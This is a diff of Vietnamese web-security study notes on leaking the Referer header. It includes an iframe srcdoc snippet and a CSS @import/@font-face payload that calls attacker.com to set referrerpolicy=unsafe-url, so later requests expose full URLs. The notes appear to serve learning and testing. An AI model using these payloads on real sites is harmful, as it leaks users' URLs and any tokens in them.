@@ -181,8 +181,8 @@ Content-Type: text/html
 ```
 - Thẻ `<meta>` và cách dùng `referrerpolicy=` không hoạt động trên Firefox
 - Nếu CSP chặn kết nối từ site nạn nhân đến server của attacker, bạn có thể lợi dụng `<iframe>` với `srcdoc=` hoặc `src=data:`.  
-    - tự thực hiện request,
-    - đọc được `document.referrer`
+    - Tự thực hiện request,
+    - Đọc được `document.referrer`
 ```html
 <!-- Nếu bạn inject được iframe này thì đã cùng origin với parent rồi -->
 <iframe srcdoc="<script>alert(document.referrer)</script>" referrerpolicy="unsafe-url"></iframe>
@@ -193,4 +193,25 @@ Content-Type: text/html
 ```
 #### Link response header with preload (Chrome < 136)
 
+- Khi nạn nhân gửi 1 request tải ảnh `image` mà nhận về `referrerpolicy` thì `referrerpolicy` đó sẽ được áp dụng cho những request lần sau 
+- Kịch bản :
+  - attacker làm cho victim load một `<img>` trỏ tới server attacker 
+  - attacker trả `header Link: ... referrerpolicy=unsafe-url`
+  - Tất cả các request tiếp theo dính `referrerpolicy=unsafe-url` 
+  - Lộ full url trong `Referer`
+- Việc này còn được thực hiện ngay trong `@import` hay là `@font-face` nếu CSP chặn ảnh của ta 
+```html
+<style>
+@import "https://attacker.com/link";  /* Required to be at the start of style tag */
 
+@font-face {
+  font-family: "leak";
+  src: url(https://attacker.com/link);  /* Works from anywhere */
+}
+* {
+  font-family: leak;
+}
+</style>
+```
+
+## [DOM clobbering](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html) 
